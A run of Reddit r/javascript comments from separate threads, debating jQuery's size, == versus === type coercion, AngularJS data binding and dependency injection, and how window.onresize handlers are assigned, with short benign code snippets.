If you have problems with the way jQuery does things, then by all means go do better. But it seems your only issue is that 'jQuery is too big for what I want to use it for', which as I said before, is not an issue at all. You can take just the parts of jQuery you want and yes, if you use a CDN your users will probably not even need to download it. That being said, if you find smaller libraries that just do what you need and have a better implementation than one of the most mature libraries the JS world has, then use it. I don't really give a rats ass what you use to be honest, I just find the "jQuery is too big" argument laughable.
Yes, Object.observe() only works on shallow objects, and then if you are interested in their children, then you can call Object.observe() on them as well. A functional computation is fine for a primitive or small structure. It is not ok for a large structure. That approach would be "reactive", but it would not be "incremental". You would re-generate the entire output structure each time anything changed. This would kill performance, responsiveness and user state within an output DOM. The solution to get performance back up is horribly complicated and way more difficult than just doing the correct thing in the first place, which is observing each input object and incrementally changing output values only as needed. Sometimes this is just changing an output property and sometimes it is pruning or adding whole sections to an output structure. Adding/removing rows for each model object for instance.
It puts a focus on testing. It has a clear separation between layers. It has a lot of large scale use at google. It has good ide support with webstorm.
Dude, there are tons of article on this. Have you even thought about googling this?
 element.style.backgroundColor = "rgba(255,255,255,0.5)";
I'm not sure that I understand. That line **is** getting executed. When I open your JSFiddle I see a number inside the `div`. When you invoke the function (`updateOnresize()`) it runs **right then and there** and the `innerHTML` of `mybox` gets set to the string representation of the value contained in `window`'s `innerHeight` property. Then, since the function doesn't explicitly `return anything`, the result of the function is `undefined` which then gets assigned to `window.onresize`. Consider this: window.onresize = function() { document.getElementById("mybox").innerHTML = window.innerWidth; } This assigns a function directly into `window.onresize` that will get invoked when the window resizes.
Which would you consider not worth looking at?
I always liked this: http://eloquentjavascript.net/contents.html 
No one raised the RBGA... but since u stated it in both the tittle and the question, remember that it isnt RBGA but RGBA. RGBA stands for red green blue alpha. You can find more about this here. [RGBA ON WIKI!](http://en.wikipedia.org/wiki/RGBA_color_space) And the right way to do so is given already.
Ah good catch. Lunch and all that.
That's pretty much it - recursion is your friend here. 
In my experience encoding data dependency graphs is very hard for people to do manually and is a source of a lot of bugs. If Object.observe() can't handle deep structures it won't help with this. So what I like to do is just use lazy evaluation and memoization to improve perf and dirty check the end result of these computations. Much easier to understand the perf and correctness.
Because one is assigning the function to onresize, the other is assigning the return result of said function (not what you want). 
Without consulting a reference or running a JS console, do you know off-hand the result of the following? "1" == [1] "" == [[]] [0] == [0] "false" == false "1" == 1 ? Do you like equality to be transitive? function checkTransitivity(a, b, c) { var transitive = (a == b &amp;&amp; b == c), result = (a == c); if(transitive &amp;&amp; !result || !transitive &amp;&amp; result) { console.log('You broke transitivity!'); } else { console.log('All is right with the world.'); } } checkTransitivity(0, 0, 0) &gt; All is right with the world. checkTransitivity("1", 1, true) &gt;All is right with the world. checkTransitivity("", [0], 0) &gt;You broke transitivity! Sometimes it's not about knowing the tools, but recognizing that one of those tools is just terrible.
It's used in one project at google and that's doubleclick.
I don't mean to be rude but why is this link here? With no comment from the submitter this looks like a karma grab rather than an instructive link for the betterment of the community.
I'm not going to lie and say that I'm a guru in it. I'm going to tell him exactly how I use it and whether he accepts it or not, I'll just let it be. On my resume I stated that I knew it on a scholastic level, and that part IS true. But yes, I shall do that. Thank you!
Sorry should have mentioned this is a response to : http://www.reddit.com/r/javascript/comments/1wkm2b/you_might_not_need_jquery/ A top post here on r/javascript a couple days ago. 
Recently there was some promotion for the ideea that "you might NOT need jquery". I'm glad somebody's trying fight back that crap.
Express has always been minimal. I would disagree with Sails being minimal though. Out of curiosity, what makes you imply Express not being minimal?
Yes. This is what the real point of the article should be, not that using === is bad. When writing new code, it's best to always try to use ===. Blindly refactoring existing == to === is what the true bad practice is -- you need to make certain that a type coercive equals isn't needed. Sometimes that involves changing things *outside* of the if-statement. I recently finished a comprehensive refactor of a 40kloc JS app, and dealt with this frequently.
yeah, you can't even add two number without jquery, so it's a must!
You are correct. Encoding data dependency graphs IS very hard for people to do MANUALLY. This is why I'm writing my own language that automatically generates the code and any runtime support structures that are necessary.
I would check out some libraries other than jQuery -- particularly angular. If you show that you are energetic about the direction JavaScript is heading I think you will get a lot further with the interviewer than if you try to explain scope or prototypal inheritance without completely understanding them.
I have no idea when `==` is ever a good idea -- it's usually a beginner's mistake or a typo, so other developers (including yourself {x} months from now) will have to pause and try to understand whether it was intentional. I think [Python's Zen](http://www.python.org/dev/peps/pep-0020/) (yes, I know, wrong language) supplies a good rule of thumb here: "explicit is better than implicit" (also "simple is better than complex" etc, i.e. don't just add verbosity for verbosity's sake). Ultimately you rarely write code for the computer. You generally write code for other programmers to read (and understand). Even if you're a solo dev, someone might inherit your code or you might come back to it in the future (and assuming you're always learning, you will likely look at your code differently from the way you look at it now). If you just see code as a creative way of expressing yourself (like poetry), that's fine -- nobody would argue against e.e. cummings never using uppercase, after all. But if you're paid to write code, or are trying to create something (a product, a library or just a utility script) for any other purpose than purely expressing yourself -- please try to treat code as a means of communication: you're trying to tell a story, please don't make it unnecessarily hard to follow. Some people argue descriptive naming conventions (where "descriptive" is often very subjective) should be sufficient, but for code that may be read by a different person you also need to take the possibility into account that they may not be a native speaker, or that there may be subtle but important differences in their vocabulary (this again also applies for your future self). As for non-strict equality: I think `if (foo)` is a common idiom for when a check for falsiness is sufficient (i.e. `foo` is a boolean and defaults to `false` or `foo` is only meaningful for truthy values).
Think I can really get it down in one day? I guess there's only one way to find out...
I don't think this is true, at least after watching the video talks of ngConf.
Depends. Do you need to differentiate between `false`/`0`/`""` and `null`/`undefined`? If not, just use `if (foo)`. The coercion in this case is explicit: `if` always takes a boolean expression, so it is clear you're looking for truthiness. The idiom for coercing to boolean is `!!foo`, but `if (!!foo)` is clearly overkill. The argument isn't about not having type coercion, it's about not having *implicit* type coercion *when comparing values*. `==` comparisons are a code smell because the coercion's outcome varies depending on both values you're comparing rather than just one. The non-coercing version of `if (foo)` is `if (foo === true)` -- the explicit expectation of the value being `true` rather than merely truthy is a special case (you're looking for one specific value) whereas the general requirement of "truthy" is the more common case. Likewise, if you want a truthy value other than `true`, you could write `if (foo &amp;&amp; foo !== true)` -- note how that's pretty much what the description says. Truthiness is a concept that needs to be learned, yes, but it's vastly easier to learn (and remember) than all the various ways `x == y` can turn out depending on the values of `x` and `y`. Likewise identity (`===`) is a relatively easy concept (and also a concept you will need to learn whether you want to use `==` or not) and has only the one exception that `NaN !== NaN` (which is also reflected in `NaN != NaN`). It's obviously a slippery slope kind of argument what concepts a reader(!) should or should not be expected to know, but the point is: if you want to understand the behaviour of `==` correctly, you need to learn about `===` and truthiness anyway; but the reverse is not true.
I think if you plan on learning angular in one day (the important bits) focus on learning controllers, scope inheritance and maybe a small bit of directives. Check out the ongoing tutorial series on LosTechies and then maybe build a super simple app. OK -- here's your task: Create a JSON file filled with an array of "People" objects (each with a name and age, say). Create a controller that loads those people into the DOM as a list with the $http service and then for bonus points, create a form within the controller scope that allows a user to add a person to the People array. I think if you enjoy learning to do that and you convey that excitement in your interview while demonstrating your limited knowledge you'll probably have your best chance. Good luck!
&gt;When using non-strict, JS always converts the right operand to the type of the left operand. Not true. ``[] == ""`` evaluates true, after all. ECMA [11.9.3](http://ecma-international.org/ecma-262/5.1/#sec-11.9.3) states: &gt; ... If Type(x) is Object and Type(y) is either String or Number, return the result of the comparison ToPrimitive(x) == y. In other words, which side of the operation is coerced depends on the type of both sides of the operator. There's probably 20 people in the world who could fully describe the algorithm I just linked from memory. But if you can't describe the algorithm from memory, you don't actually know how ``==`` operates. At best, you mostly know. And the fact that it's intransitive is worse than the complexity of its behavior. The idea of an intransitive equality operator goes against, well, the very concept of an equality operator. **Edit**: While we're at it... When converting booleans to strings, you get the strings ``"true"`` and ``"false"``, not ``"1"`` and ``""``--see [ECMA 9.8](http://ecma-international.org/ecma-262/5.1/#sec-9.8). When comparing, say, a boolean to an array, you go by way of numbers. ``true`` is coerced to 1 and ``false`` to +0. And then the array is coerced to the empty string which is then coerced to the number 0. And then you compare the two numbers.
The problem is not that you need to have a good understanding of how types will coerce. You need to have a *complete* understanding of it. And the same goes for everyone who will ever have to read your code. If either of you doesn't fully understand how it behaves, there will be bugs -- either in the code, or in the way the code is understood (and therefore expected to behave). Sure, if you want to be able to say you have a professional level of understanding of JavaScript, you should understand type coercion. But the same goes for `with`, `eval`, `switch`-fallthroughs, and so on. That doesn't mean you should use every feature everywhere. The difference between being a rockstar programmer and a professional developer is the ability to produce code that not only works but that is also maintainable and easy to reason about for other people. There is a wide spectrum between code golf and Enterprise Java, you don't need to choose one or the other.
Q.E.D. The number of people in this discussion who mis-guess what the outcome of these coercions will be should give you an idea of the likeliness of Average Joe interpreting your code correctly when they see it. And if they misinterpret it and then write code based on those misunderstandings, there will be bugs. And those bugs will be there even if their code matches their understanding perfectly -- because there was a failure in communicating what your code does. EDIT: if you can't find any sympathy for them, imagine it's you, at 3 am, on the day you're meant to go live, and it's not your JS code but somebody's PHP code. And you've spent the last three months exclusively writing Python.
Internship you want to come off as personable, quick learner, self motivated and basically competent. I wouldn't worry about 'advanced' javascript; read the standard stuff, learn quirks, play with it for a bit but with an intern you want somebody who will require minimal effort to train and get alone with. You don't hire anything junior for their expertise under normal circumstances.
You're adding the click event handlers to every item in the list every time you add an item to the list. That results in some crazieness, so all you have to do is change your appendName function to something like this: var $item = $("&lt;div class='listGroup'&gt;&lt;div class='listObj'&gt;"+name+"&lt;/div&gt;&lt;a href='javascript:void(0);' class='edit' setting='0'&gt;Edit&lt;/a&gt;&lt;a class='remove' href='javascript:void(0);'&gt;Remove&lt;/a&gt;&lt;/div&gt;"); $(".list").append($item); $(".enterName").val(""); $item.on("click", ".remove", function(){ removeName($(this)); }); $item.on("click", ".edit", function(){ edit($(this)); }); That way you are only adding the event listener to the single element you are actually adding to the list.
Then again with Angular, you might not
The main contributor is a google employee, that's what it has going for it. If you decide to use it be aware that it does dirty checking for your bindings, over 2000 bindings and your application tends to suffer performance drastically (or so I've read) Anything Google uses = instant success 
Interesting. Haven't heard of it before, but might try it out on a small project I'm working on now.
No. Try a smaller library instead, like knockout
"Why you should always..." JS articles usually end up in me questioning the poster's knowledge of JS. This is no exception.
blog spam. A cheap, uninformative post compiled by a few Google searches.
Somebody gets it! 
This is actually pretty fun and useful! I'm liking it so far! Thank you!
They're going to regret putting that ~3 meg PNG image on their homepage.
Those people are correct. The javascript property **backgroundColor** is the translation of the CSS property **background-color**. The javascript property **background** is the translation of the CSS property **background**. They are two different things. While you can set the background color with **background**, you can also use it to set every other background property via CSS shorthand notation. For example, "background: #fff url(/path/to/image.png) top left no-repeat scroll". If you just want to set the background color without altering other properties of the background, you should use backgroundColor, not background.
That is only a small part of it. Have you ever used it? It's a joy to code in.
JavaScript.
I think I can make this a little clearer for you by taking a slightly different approach. "resize" is an event that browser fires when the window gets resized. You can attach an event listener to it and run a specific function of your own design like this: window.addEventListener("resize",function(){ alert("window resized"); }); with this listener attached, the function I passed in as the second argument will run every time the window is resized. You could also pass in a named function like this: function showAlert(){ alert("window resized"); } window.addEventListener("resize",showAlert); I mention this method, because I wonder if seeing code like this is where you are getting confused about the parenthesis. Note that as is, you can't use a function that you need to pass arguments to but in this case our showAlert functions doesn't require any (there are ways to get around this but that'd be distracting). So with window.onresize we have a built in function that has already attached an event listener to the resize event for us and guess what.....it has a callback function it runs with each resize event as well. It looks like this: function() { } :). It does nothing. So when you do: window.onresize = function() { alert("window resized"); } you are overriding that function the browser automatically attached to the "resize" event for us that does nothing. Again, you could do: function showAlert(){ alert("window resized"); } window.onresize = showAlert; and it will work. This is saying to replace that built-in, do nothing function the browser provides with the function declaration named "showAlert". So, when you do this: function addStuff() { alert(2+3); } window.onresize = addStuff() order or precedence means addStuff gets run (and the alert happens) and 'undefined' is return. So, now window.onresize is undefined. If you do: window.onresize = addStuff. Add stuff will run every time the window resizes. So, the only way to use the parenthesis that makes sense in this context is if your function returns a function. You could do this: function addStuff() { //really complex function stuff var message = 3 + 2; return function() { alert(message); } } window.onresize = addStuff(); this will run addStuff first, but add stuff returns a function that alerts with a message. So now, that inner function has overriden that built in, do nothing function the browser creates and will run every time the "resize" event is fired. Sorry, if that was too simple, or verbose but hopefully it clears up what is really going on here with the onresize method. 
Most of these are workarounds for older browsers that have been replaces or are introduced because of the way jQuery works (for instance firefox &lt;20 throwing an error when trying to get at the constructor of some objects). Even then putting a try/catch around in normal code would have covered this without bringing in the whole of jQuery. Yes, jQuery does smooth over some differences between browsers, but those differences are decreasing and it's not necessary to pull in the whole of jQuery every time you start and application because of an inconsitency you *might* hit. You should always develop with the best intentions. Using abstractions in code will allow you to fix any problems that may arise
# Data bindings Instead of manipulating the DOM explicitly, you define your data in one place and mark HTML elements that depend on that data. Other libraries that do this: Knockout, Rivets.js # Encapsulation of HTML+JS into components AngularJS has "directives" which can be automatically applied to your HTML to modify elements in various ways. For example, you could use a pseudo-HTML element "accordion" and have a directive that replaces it in-place with the correct HTML and adds the necessary behaviour. Other libraries that do this: Ember.js (kinda?), Polymer # Dependency Injection / IoC Angular has a DI mechanism which lets you declare dependencies and then simply define functions that are invoked with them as arguments. Syntactic sugar: to avoid repeating yourself, you can simply name your function arguments after the dependencies and Angular will do the right thing. For minification there's a small script you can use to convert your code into the more verbose format so argument names can be safely minified. Other libraries that do this: none in particular? Most IoC/DI libraries seem to work very differently. # Everything else * It has pretty good tooling support (WebStorm seems to be very invested, there are also dev extensions for Chrome and, I think, Firefox). * It is very unopinionated about how you structure your code (you can even side-step its module system to a degree). Sadly this also means the tutorial doesn't even remotely reflect community best practices (globals, ick). * It is very unopinionated about the "M" and "C" in "MVC". It really just wants to glue together your controllers and your HTML. Unlike Ember it doesn't want to know how your server API works. Unlike Knockout it doesn't force you to use "observables" for your model properties. Unlike Backbone it doesn't use silly getters and setters. * It embraces promises (deferreds/futures). Its Ajax functions return promises, lots of its behaviour seems to take promises into account. It's promises implementation isn't great, but it's not as broken as jQuery's. * It's backed by Google. This may or may not be a good thing. * It embraces Dart, *optionally*. AngularDart seems to be the new hotness, but AngularJS seems to maintain feature parity and won't go away anytime soon. * It embraces testing and testability. Its DI mechanism makes mocking trivial and unit tests easier. End-to-end testing seems to be easy, too. * It has gained a lot of traction. The first official "ngconf" was broadcast via live stream last month with talks being uploaded on YouTube the second they were finished. Various blogs are obsessing over the "MEAN" stack, i.e. MongoDB, Express, AngularJS and Node.js -- though I'm fairly certain this is a fad, considering MongoDB's popularity recently took a few major hits. * It's fun. But that's just my personal opinion.
All property names are strings. Even on arrays. And array indices are simply property names that happen to consist of digits. The bug was that the code (intentionally) implicitly converted the indices (numbers) to strings, which changing equality strictness broke. The correct version using `===` would have had to explicitly convert the property names to numbers before comparing them to the indices, like so: if (+index === 0) Or more verbosely (and less readably): if (parseInt(index, 10) === 0) Or, to replicate the original behaviour more closely: if (index === "0") (which IMO isn't very nice)
Thanks so much for that! That was my problem! 
You assume they'll get boat loads of traffic...
http://lodash.com/docs
Doing it this way (with `.on()` calls) will also catch the event if you happen to add/ remove `.remove` or `.edit` elements.
I agree 100 percent. 
&gt; Using abstractions in code will allow you to fix any problems that may arise Like, say, `$('#id').hide()` from a good abstraction library, perhaps jQuery?
Plain Ole' vanilla JavaScript? 
I'm going to go in with that attitude, and trust me... I interview well. But I just read horror stories about people springing up with surprise code puzzles. It makes me want to build an army of knowledge... Not that I already wasn't building one without the interview in mind. 
A couple of points here: Despite all of the buzz/talk around Angular (meaning I hear A LOT about it), you are the first person I have seen use the word "unopinionated" in the same sentence as "Angular". In fact, every single person I know that has adopted Angular has done so specifically because it is considered __extremely__ opinionated. Most of these people felt that Backbone left too much open to interpretation and wanted a framework that made more of the design decisions for them. 2) Getters and setters are not "silly". They provide encapsulation (a basic tenet of software design/development). Furthermore, two-way binding does nothing for your app. It simply makes your life easier. However, two way binding comes at a very high cost as there is no way to do it without dirty checking. In large scale apps (in a world where we must think mobile first) this can be a massive performance cost that directly hurts your users and therefore, your bottom line. Ask yourself *how* Angular allows you to avoid setters and getters and the ramifications of this (or better yet, dig into the code, create jsperfs, etc). The fact is it really depends on the project, but it is certainly provable that the current state of two way binding (until we have wide support for Object.observe) means a large performance cost with complex apps and that brings me to my next point... 3) Do you know exactly how DI is implemented in Angular? Essentially, the entire code base has to be regexed because this is javascript...Again, you can imagine the performance implications here with complex apps. I don't know about you but when it comes to single page applications that I need to be performant on old versions of the stock android browser, those are not sacrifices I can afford to make. There are situations where these sorts of frameworks work out perfectly because most of these concerns aren't there so you can get things done quickly with something like Angular. However, Angular being some sort of grand solution as people sell it to be just isn't true with SPAs. We are not at a point where these sorts of app's are going to be 'easy' or a 'joy' to work with. There are far too many hardware and software/environment constraints to consider and factor in at this point in our history. 
What do you question about it?
I was going to say "it useful for falsy values but I agree that it generates more problems than solutions" but then I realized that Python has falsy values without type coertion and thus avoids this problem.
&gt; Most people don't know the term "non-restrictive relative clause," for example [C'mon, now. Don't hold out.](https://en.wikipedia.org/wiki/English_relative_clauses#Restrictive_or_non-restrictive)
Thank you!
Thanks!
I'll give it a go, thanks!
&gt;but nothing beats vs intellisence For sure? So...... just for writing some JS, it's probably the best!?
Thank you!
Thanks!
: nods : Thank you!
Thanks for the tips and list!
Why does everyone get so hurt over responses. The fact is, there is no reason to hop over a language feature just because people who don't understand it say it's bad. It's just insanity. Especially of they agree with the article, when obviously this guy has bigger problems. He just changed == to === without even thinking about issues. Maybe they did it for a reason. Maybe they knew what types of arguments that function would get, they didn't need to check for the same types.
You may not need jQuery. There is no reason to bash the people that don't need it. The point of the "you may not need jQuery" thing seemed to be, decide on your own if you need it. Don't blindly just add it to your project, like most people do.
They claim touch compatibility, but the experience isn't great -- the dialogs fall off the screen when trying to edit links.
Woops! Thanks for clearing that up, that's good to know that I can specify them all with one line! 
In JS, types are coerced if you use ==, !=, or +. Truthiness is a separate issue. As a language designer, you can define whatever you want as truthy or falsy. The way JS handles that part isn't that bad, but it would be better if that wrapper object machinery wasn't exposed: &gt;&gt;&gt; !!new Number(0) true &gt;&gt;&gt; !!new Boolean(false) true &gt;&gt;&gt; !!new String('') true And it would be perhaps more useful if empty arrays were falsy: &gt;&gt;&gt; !![] true In Dart, only `true` is truthy. I'm not really sure if that's the best way to do it, but in practice it really isn't that inconvenient since APIs typically accommodate to that. E.g. `List` has `isEmpty` and `isNotEmpty` properties (kinda like Ruby's `empty?` and `any?`).
Heheheh.. JSON.stringify(a) === JSON.stringify(b);
The table layout is a tough one to accomplish in divs. Tables are so strong to use for tabular data, but they lack in certain stylistic elements. I found a problem with ng-grid that caused the column headers to crowd in on eachother and submitted an issue. The fix could be fairly simple, but it involves window resize detection and using CSS properly (ng-grid uses Javascript a lot when it doesn't need to).
Haven't checked ng-grid before. Seems nice but one thing I noticed right away is that when making selections in multi page grid you lose the highlighting when switching pages. Couldn't use it without fixing that one. I'll give it a look and see if there's something I can contribute, I definately see this as being useful in future projects.
 ‚îú‚îÄ‚î¨ express@3.2.5 ‚îÇ ‚îú‚îÄ‚îÄ buffer-crc32@0.2.1 ‚îÇ ‚îú‚îÄ‚îÄ commander@0.6.1 ‚îÇ ‚îú‚îÄ‚î¨ connect@2.7.10 ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ bytes@0.2.0 ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ cookie@0.0.5 ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ formidable@1.0.14 ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ pause@0.0.1 ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ qs@0.6.5 ‚îÇ ‚îú‚îÄ‚îÄ cookie@0.1.0 ‚îÇ ‚îú‚îÄ‚îÄ cookie-signature@1.0.1 ‚îÇ ‚îú‚îÄ‚îÄ debug@0.7.4 ‚îÇ ‚îú‚îÄ‚îÄ fresh@0.1.0 ‚îÇ ‚îú‚îÄ‚îÄ methods@0.0.1 ‚îÇ ‚îú‚îÄ‚îÄ mkdirp@0.3.4 ‚îÇ ‚îú‚îÄ‚îÄ range-parser@0.0.4 ‚îÇ ‚îî‚îÄ‚î¨ send@0.1.0 ‚îÇ ‚îî‚îÄ‚îÄ mime@1.2.6 ‚îú‚îÄ‚î¨ jade@1.1.5 ‚îÇ ‚îú‚îÄ‚îÄ character-parser@1.2.0 ‚îÇ ‚îú‚îÄ‚îÄ commander@2.1.0 ‚îÇ ‚îú‚îÄ‚î¨ constantinople@1.0.2 ‚îÇ ‚îÇ ‚îî‚îÄ‚î¨ uglify-js@2.4.12 ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ async@0.2.10 ‚îÇ ‚îÇ ‚îú‚îÄ‚î¨ optimist@0.3.7 ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ wordwrap@0.0.2 ‚îÇ ‚îÇ ‚îú‚îÄ‚î¨ source-map@0.1.31 ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ amdefine@0.1.0 ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ uglify-to-browserify@1.0.2 ‚îÇ ‚îú‚îÄ‚îÄ mkdirp@0.3.5 ‚îÇ ‚îú‚îÄ‚î¨ monocle@1.1.51 ‚îÇ ‚îÇ ‚îî‚îÄ‚î¨ readdirp@0.2.5 ‚îÇ ‚îÇ ‚îî‚îÄ‚î¨ minimatch@0.2.14 ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ lru-cache@2.5.0 ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ sigmund@1.0.0 ‚îÇ ‚îú‚îÄ‚î¨ transformers@2.1.0 ‚îÇ ‚îÇ ‚îú‚îÄ‚î¨ css@1.0.8 ‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ css-parse@1.0.4 ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ css-stringify@1.0.5 ‚îÇ ‚îÇ ‚îú‚îÄ‚î¨ promise@2.0.0 ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ is-promise@1.0.0 ‚îÇ ‚îÇ ‚îî‚îÄ‚î¨ uglify-js@2.2.5 ‚îÇ ‚îÇ ‚îú‚îÄ‚î¨ optimist@0.3.7 ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ wordwrap@0.0.2 ‚îÇ ‚îÇ ‚îî‚îÄ‚î¨ source-map@0.1.31 ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ amdefine@0.1.0 ‚îÇ ‚îî‚îÄ‚î¨ with@2.0.0 ‚îÇ ‚îî‚îÄ‚î¨ uglify-js@2.4.0 ‚îÇ ‚îú‚îÄ‚îÄ async@0.2.10 ‚îÇ ‚îú‚îÄ‚î¨ optimist@0.3.7 ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ wordwrap@0.0.2 ‚îÇ ‚îú‚îÄ‚î¨ source-map@0.1.31 ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ amdefine@0.1.0 ‚îÇ ‚îî‚îÄ‚îÄ uglify-to-browserify@1.0.2
Now, I'd love to see 7 "maximal" web frameworks, like Django for Node.
It's not capturing the tab key for me (Chrome 32). No good without that. 
Free for personal projects though. I don't know of any WYSIWYG FOSS editors off the top of my head...
And? It has a lot of dependencies, doesn't mean express itself isn't minimal when it comes to the API. Even then, it's including things like Jade making it a slightly unfair bias.
I used to always head for sublime on my JavaScript projects until I found WebStorm. It's super customizable and the intellisense and refactoring tools are amazing. I still go back to Sublime for minor tasks as it generally opens quicker for fast changes and the multiple cursor tools are hard to find elsewhere.
If you include the 3rd party libraries in the project, IDEs such as WebStorm will certainly provide intellisense for it.
chirp chirp.... chirp chirp... I can hear the crickets in this comments section lol. Reddit speechless or something? (I have nothing to say, i just love clojure/script and have been reading david's blog for a while and like reading random debates between people who know more about this than me -- especially since I've been working on learning this Om framework)
Neat. Can you shed some light on the extent of what they can do?
[Prototypes](http://code.tutsplus.com/tutorials/prototypes-in-javascript-what-you-need-to-know--net-24949)
Once again I'm wondering why you need to include jQuery just for one component. If you are working with AngularJS for example, you probably don't want to include jQuery since jqLite offers the same basic functionality.
I would like to see an Om port using [Mori](https://github.com/swannodette/mori)
You missed the point of the original post and my reply.
its not free... 
For starters here's some code examples http://www.espruino.com/Code+Examples
s/Community Round-up #15/ClojureScript Round-up #1/ :)
Good point. Fixed. We forgot to optimize that image.
With lossless optimization: http://i.imgur.com/1n9U6ij.png
[Actual link](http://david.li/waves/), because OP is a gibbon.
I understand where you're coming from, and people make this argument all the time. But I don't go for it. "People are stupid so you should write stupid code so that they understand it". Thankfully my coworkers are actually competent and understand how type coercion works.
I'm not saying you should use them. I'm not saying you should show off how amazing your understand of the language is by using coercion when you shouldn't. I'm saying it's silly to just say "it's too hard and unpredictable", give up on learning that part of the language, and write `===` everywhere even when it's totally unnecessary. The same goes for `with`, `eval` and `switch`. Learn them. Make your own decisions. Be an adult. Trust others to do the same.
5 months later: Hey, how is your functional js coming along? I am learning this too.
Just got mine delivered along with Bluetooth modules and the wireless senders/receivers. Too everyone wanted to start electronics or home automation this is a really great start. It has 44 GPIO Pins, which can handle: 26 PWM Pins, 16 ADC Pins, 3 USARTs, 2 SPI, 2 I2C and 2 DACs. I ordered also a [RGB-123 LED Panel](http://rgb-123.com/shop/) (another kickstarter project). I've got it running within a few minutes, it's that easy. It has libraries for led control, temperature monitoring, support for a HTTP server. [Official website can be found here.](http://www.espruino.com/)
Jquery for a long time. And then with the boom of JS MV_ Frameworks, i chose AngularJS. It is pretty awesome. I think angularJs combines all of the aforementioned Libraries into one.
Like most people, I started with jQuery and fetching blobs of HTML from the server - which works great for what I call "web pages" which are made by "web designers". When I started doing when I started doing "web applications", which are made by "web developers"; it's a whole different ballpark. Generally the rule is: only speak in JSON, and strong separation of concerns. That's when things like Backbone/Knockout/Angular/etc become very important. From the little I know about Rails, it encourages JSON APIs on the server side, which go great with any of the many client-side frameworks. The main piece of advice with any of them is to understand jQuery's place. And that is in very isolated parts of your code; the reusable **user interface** components. You shouldn't see any jQuery usage where you're interacting with the server; or handling data, etc. Lodash, and Bluebird are possibly the most useful libraries in your application code. Backbone and Rails are used together a lot, so I'd assume they work well together (but I could be wrong).
Then I guess I find all of this to be nonsense 
1) All Angular does is provide functions to register your controllers and services and provide a DI mechanism. I'd say that's pretty unopinionated. Granted, it's a lot more opinionated than Knockout (which really only cares about bindings), but compared to, say, Ember it is very unopinionated. I guess it depends on what you compare it to. 2) I understand how getters and setters work and why libraries use them. But requiring them for dirty checking is a hack to solve ES5's shortcomings. They will no longer be necessary with ES6's `Object.observe` once it is standardized and widely available. In any case, Angular's performance is actually pretty good because it doesn't blindly check every object -- especially if you use its scopes intelligently and don't just dump everything in $rootScope. I've actually written an observables implementation in JS (`obs` on npm) after using them in Knockout so I understand fully what their benefits are. The problem is that you either have to specify the dependencies between your observables explicitly or you'll end up creating unintentional dependencies causing expensive re-runs of your bindings as you can run into in Knockout. The benefit of being able to use plain object means as models also means you have to do less conversions between the various layers of your applications (e.g. deserializing Ajax responses) and that you don't have to wrap everything in a special model structure just to be able to reflect changes. 3) That's not entirely correct. In production your code should be minified, so the dependencies will be explicitly specified as an array of strings, similar to how it's done in AMD -- no pattern matching necessary. If you use the syntactic sugar (i.e. just functions with named arguments) all it has to do is parse the result of `toString`-ing the function -- which is arguably a bit dirty but as I said shouldn't be used in production. This also only has to happen when the function is registered (i.e. during initial setup), not every time it is used. I don't think "it may be slow on Android 2.x" is a good argument against AngularJS in general. It's a valid argument against using AngularJS for widely deployed mobile apps the way you'd use it for web apps, but chances are you'll have to write a different app for mobile in the first place (just look at the major SPA players, e.g. Facebook and YouTube). This is really just the "IE6 is crap so your app needs to be crap" (or "feature phones don't know JavaScript so your mobile app can't use JavaScript") argument under new guise. Yes, you probably shouldn't use AngularJS to build SPAs for legacy low-powered mobile devices. But this doesn't mean you can't use AngularJS *ever*. Of course you shouldn't use AngularJS for everything, just as you shouldn't use any other technology for everything. There is no panacea. But for the specific use cases AngularJS covers (i.e. rich clients on the desktop or on mid-to-high end mobile devices) it's a valid option. You're right: before you use it you should test its performance on the range of devices you'll want to support -- but that should be true for any nontrivial library you wan to use. That said, let me clarify what I meant by "fun": AngularJS doesn't magically make everything work for you or allow you not to write any code yourself. But it happens to mostly match my mental model very closely (its module mechanism is an obvious exception -- I prefer CommonJS modules via browserify; and yes I used browserify before it became the new hotness in the "blogosphere"). I would probably prefer Polymer because it directly uses real web components, but sadly dropping support for IE9 (or generally every non-bleeding-edge browser out there) is not yet an option for the projects I work on.
I'd probably react the same way if you made an argument that `===` is more performant. It's absurd to imply this kind of performance difference should have any say in how you write your code. This is premature micro-optimization, which is terrible. This is also completely orthogonal to the article itself -- yes he shouldn't have blindly swapped out `==` and `===` exactly because the two behave differently (and thus blindly swapping them out is prone to break code) but that's true whether one is faster than the other or not. The only thing I'm reacting strongly to here is the implied notion that you shouldn't use `===` because it's slower ([which happens to be false anyway](http://jsperf.com/triple-equals-vs-double-equals/9): it's nearly twice as fast when the types need coercion). Unless you find a valid reason why a piece of code needs to be optimized, you should err on the side of readability, not performance -- i.e. we can argue about which one is easier to understand, but bringing up performance (even more so when your claims are false) is invalid.
Wasn't saying that was a reason. I clearly mentioned several reasons why. That was more of a "this is something I heard but haven't tested." And what about when types don't need coercion? == when no coercion is needed?
35% - and I accidentally answered one question correctly by mis-clicking :/
